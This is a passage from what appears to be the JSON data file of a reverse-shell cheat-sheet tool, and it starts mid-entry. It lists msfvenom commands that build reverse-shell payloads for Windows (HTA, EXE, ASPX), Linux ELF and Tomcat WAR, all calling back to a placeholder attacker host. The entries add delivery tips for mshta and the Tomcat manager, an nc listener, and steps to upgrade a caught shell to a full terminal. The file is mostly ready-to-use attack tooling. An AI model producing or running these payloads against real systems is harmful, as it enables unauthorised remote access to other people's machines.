        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "msf-win-x64-hta": {
    "bash-prompt": {
      "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f hta-psh -o rev.hta",
      "prepare": null,
      "notes": [
        "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
        "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.",
        "Run it with the 64-bit mshta: C:\\Windows\\System32\\mshta.exe <path or URL of rev.hta>. C:\\Windows\\SysWOW64\\mshta.exe is 32-bit, and a double-click may use it (check the .hta association): if the shell never arrives, check which mshta ran it.",
        "Pasted as-is at a real bash prompt.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "msf-win-x86-exe": {
    "bash-prompt": {
      "text": "msfvenom -p windows/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe -o rev32.exe",
      "prepare": null,
      "notes": [
        "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
        "x86 for Veil/Shellter",
        "Pasted as-is at a real bash prompt.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "msf-linux-x64-elf": {
    "bash-prompt": {
      "text": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f elf -o rev.elf",
      "prepare": null,
      "notes": [
        "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
        "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.",
        "Pasted as-is at a real bash prompt.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "msf-win-x64-aspx": {
    "bash-prompt": {
      "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f aspx -o rev.aspx",
      "prepare": null,
      "notes": [
        "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
        "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.",
        "Pasted as-is at a real bash prompt.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "msf-java-war": {
    "bash-prompt": {
      "text": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f war -o rev.war",
      "prepare": null,
      "notes": [
        "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
        "Deploy through the Tomcat manager (or drop it in webapps/), then browse to /rev/ to fire it: the app's path is the file name without .war, or the path= you deploy it with. The text deploy (/manager/text/deploy) needs a manager-script user.",
        "Pasted as-is at a real bash prompt.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "upgrade-1-pty-python": {
    "bash-prompt": {
      "text": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
      "prepare": null,
      "notes": [
        "penelope upgrades on its own: skip all of these steps when you caught the shell with penelope.",
        "No python? Use the script step instead.",
        "Pasted as-is at a real bash prompt."
      ]
    }
  },
  "upgrade-1-pty-script": {
    "bash-prompt": {
      "text": "script -qc /bin/bash /dev/null",
      "prepare": null,
      "notes": [
        "penelope upgrades on its own: skip all of these steps when you caught the shell with penelope.",
        "Pasted as-is at a real bash prompt."
      ]
    }
  },
  "upgrade-2-background": {
    "bash-prompt": {
      "text": "Ctrl-Z",
      "prepare": null,
      "notes": [
        "Pasted as-is at a real bash prompt."
      ]
    }
  },
  "upgrade-3-raw": {
    "bash-prompt": {
      "text": "stty raw -echo; fg",
      "prepare": null,
      "notes": [
        "Run this in YOUR terminal, not the target's, right after Ctrl-Z.",
        "Pasted as-is at a real bash prompt."
      ]
    }
  },
  "upgrade-4-term": {
    "bash-prompt": {
      "text": "export TERM=xterm-256color",
      "prepare": null,
      "notes": [
        "Pasted as-is at a real bash prompt."
      ]
    }
  },
  "upgrade-5-size": {
    "bash-prompt": {
      "text": "stty rows 40 cols 160",
      "prepare": null,
      "notes": [
        "Pasted as-is at a real bash prompt."
      ]
    }
  },
  "upgrade-6-home": {
    "bash-prompt": {
      "text": "export HOME=/home/{USER}",
      "prepare": null,
      "notes": [
        "when the shell inherited root's HOME",
        "Pasted as-is at a real bash prompt.",
        "Set USER first."
      ]
    }
  }
};
